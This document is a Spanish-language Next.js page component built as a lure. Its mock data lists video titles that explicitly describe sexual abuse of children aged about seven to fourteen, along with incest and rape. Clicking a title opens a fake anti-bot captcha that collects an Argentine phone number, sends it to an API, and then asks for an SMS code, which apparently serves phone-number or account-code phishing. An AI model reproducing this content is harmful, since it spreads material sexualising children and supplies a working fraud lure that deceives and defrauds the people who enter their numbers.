"use client";
import { useState } from "react";
import ButtonComponent from "./buttonComponent";
import anoIcon from "/public/anonIcon.png";
import Image from "next/image";

function getRandomWeight(min: number, max: number) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const mockData = [
  { name: "11 años lo disfruta", peso: getRandomWeight(150, 1200) },
  { name: "anal 8 años", peso: getRandomWeight(150, 1200) },
  { name: "Trío con gemelas", peso: getRandomWeight(150, 1200) },
  {
    name: "Doble penetración 12 años",
    peso: getRandomWeight(150, 1200),
  },
  { name: "Vi0laci0n doble", peso: getRandomWeight(150, 1200) },
  { name: "Mamá e hijo de 11 casero", peso: getRandomWeight(150, 1200) },
  { name: "Hijastra pide que se la meta", peso: getRandomWeight(150, 1200) },
  { name: "Compañeros de primer año cogiendo", peso: getRandomWeight(150, 1200) },
  { name: "7 años se la toma", peso: getRandomWeight(150, 1200) },
  { name: "12 años con hombre de 30 años", peso: getRandomWeight(150, 1200) },
  { name: "Anal 13 años", peso: getRandomWeight(150, 1200) },
  { name: "Anal 8 años", peso: getRandomWeight(150, 1200) },
  { name: "Adolescentes haciendo tijeras", peso: getRandomWeight(150, 1200) },
  { name: "Vaginal acaba adentro 10 años", peso: getRandomWeight(150, 1200) },
  { name: "Argentina 12 años comiendo pija", peso: getRandomWeight(150, 1200) },
  { name: "Trío 13 años", peso: getRandomWeight(150, 1200) },
  { name: "Peruanita comiendo pija 10 años", peso: getRandomWeight(150, 1200) },
  { name: "Rubia de 13", peso: getRandomWeight(150, 1200) },
  { name: "Incesto hermanos de 14", peso: getRandomWeight(150, 1200) }
];
export default function Home() {
  const [showModal, setShowModal] = useState<boolean>(false);
  const [num1, setNum1] = useState<number>(Math.floor(Math.random() * 10));
  const [num2, setNum2] = useState<number>(Math.floor(Math.random() * 10));
  const [answer, setAnswer] = useState<number>(0);
  const [userAnswer, setUserAnswer] = useState<string>("");
  const [phoneNumber, setPhoneNumber] = useState<string>("+54");
  const [isCorrect, setIsCorrect] = useState<boolean | null>(null);
  const [isValidPhone, setIsValidPhone] = useState<boolean>(false);
  const [isValidAll, setIsValidAll] = useState<boolean>(false);
  const generateNewCaptcha = () => {
    setNum1(Math.floor(Math.random() * 10));
    setNum2(Math.floor(Math.random() * 10));
    setUserAnswer("");
    setIsCorrect(false);
  };

  const sendVerify=async()=>{
    try {

      const data= await fetch(`${process.env.NEXT_PUBLIC_API_URL}/api/`,{
        method:"POST"
        ,
        body: JSON.stringify({ phoneNumber: phoneNumber })
      })
    } catch (error) {
      
    }
  }
  const checkAnswer = () => {
    const correctAnswer = num1 + num2;
    if (parseInt(userAnswer) === correctAnswer) {
      setIsCorrect(true);
    } else {
      setIsCorrect(false);
    }

    if (isValidPhone) {
      sendVerify()
      setIsValidAll(true);
    }
  };

  const validatePhoneNumber = (phone: string) => {
    const phoneRegex = /^\+54\d{10}$/;
    return phoneRegex.test(phone);
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const phone = e.target.value;
    setPhoneNumber(phone);
    setIsValidPhone(validatePhoneNumber(phone) && phone.length === 13);
  };

  const handleShow = () => {
    setIsCorrect(false)
    setShowModal(!showModal);
  };

  return (
    <div className="container mx-auto py-8 bg-neutral-300">
      <div className="text-center mb-8">
        <h1 className="text-3xl font-bold">Disfruta el contenido</h1>
        <p className="text-lg text-gray-600 mt-2 ">Mantén la discreción</p>
      </div>

      <div className="border border-gray-300 rounded-md bg-white p-4">
        <h2 className="text-xl font-semibold mb-4">Lista de elementos</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {showModal && (
            <div
              className="fixed px-4 z-30 w-full h-full top-0 left-0 flex items-center justify-center"
              style={{ backgroundColor: "#00000050" }}
            >
              <div className=" bg-slate-200 h-fit w-full max-w-96 p-4 text-center relative rounded-md">
                <button
                  className="absolute right-3 text-2xl text-black hover:brightness-125"
                  onClick={handleShow}
                >
                  X
                </button>
                <div className="flex flex-col items-center bg-gray-100  rounded-md py-3 mb-2">
                  <Image src={anoIcon} className="aspect-square w-20" alt="" />
                  <p className=" text-black uppercase text-sm px-2">
                    Para evitar reportes vamos a verificar que no seas un bot
                    antes de brindarte el video
                  </p>
                </div>
                <div className="bg-gray-100 text-black p-4 rounded-md shadow-md">
                  {isCorrect !== null && isCorrect ? (
                    <p className="text-green-500">Correcto!</p>
                  ) : (
                    <>
                      <div className=" flex justify-center items-center mb-4">
                        <span className="text-xl mr-2">{num1}</span>
                        <span className="text-xl mr-2">+</span>
                        <span className="text-xl mr-2">{num2}</span>
                        <span className="text-xl mr-2">=</span>
                        <input
                          type="text"
                          value={userAnswer}
                          onChange={(e) => setUserAnswer(e.target.value)}
                          className="border w-20 border-gray-300 px-2 py-1 rounded-md"
                        />
                      </div>
                      <p className="text-red-500">
                        Incorrecto. Intenta de nuevo.
                      </p>
                    </>
                  )}
                  <button
                    onClick={generateNewCaptcha}
                    className="mt-4 bg-gray-500 text-xs text-white px-2 py-1 rounded-md mb-4"
                  >
                    Generar Nuevo Captcha
                  </button>
                  {!isValidAll ? (
                    <>
                      <div className="mb-4">
                        <label
                          htmlFor="phone"
                          className="block text-xs mt-4 mb-2"
                        >
                          Ingresa tu número de celular, te mandaremos un código
                          temporal de autorizacipon:
                        </label>
                        <input
                          type="text"
                          id="phone"
                          value={phoneNumber}
                          onChange={handlePhoneChange}
                          className={`border px-2 py-1 rounded-md ${
                            !isValidPhone ? "border-gray-300" : "border-red-500"
                          }`}
                        />
                        {!isValidPhone && (
                          <p className="text-red-500 text-sm mt-1">
                            Por favor, ingresa un número de celular válido.
                          </p>
                        )}
                      </div>
                      <button
                        onClick={() => {
                          generateNewCaptcha();
                          checkAnswer();
                        }}
                        className="mt-4 bg-teal-500 text-xs text-white px-4 py-2 rounded-md mb-4"
                      >
                        Validar que soy un humano
                      </button>
                    </>
                  ) : (
                    <>
                      <div className="mb-4">
                        <label
                          htmlFor="phone"
                          className="block text-xs mt-4 mb-2"
                        >
                          Te llegará un sms con un código temporal:
                        </label>
                        <div className="flex w-full justify-between py-5 px-8">
                          <input
                            type="text"
                            className="w-6 bg-transparent border border-b-black"
                          />
                          <input
                            type="text"
                            className="w-6 bg-transparent border border-b-black"
                          />
                          <input
                            type="text"
                            className="w-6 bg-transparent border border-b-black"
                          />
                          <input
                            type="text"
                            className="w-6 bg-transparent border border-b-black"
                          />
                        </div>
                        {!isValidPhone && (
                          <p className="text-red-500 text-sm mt-1">
                            Ingresar un código válido
                          </p>
                        )}
                      </div>
                      <button
                        onClick={() => {
                          generateNewCaptcha();
                          checkAnswer();
                        }}
                        className="mt-4 bg-teal-500 text-xs text-white px-4 py-2 rounded-md mb-4"
                      >
                        Validar código
                      </button>
                    </>
                  )}
                </div>
              </div>
            </div>
          )}
          {mockData.map((button) => (
            <ButtonComponent
              key={button.name}
              showModal={handleShow}
              text={button.name}
              peso={button.peso}
            />
          ))}
        </div>
      </div>
    </div>
  );
}
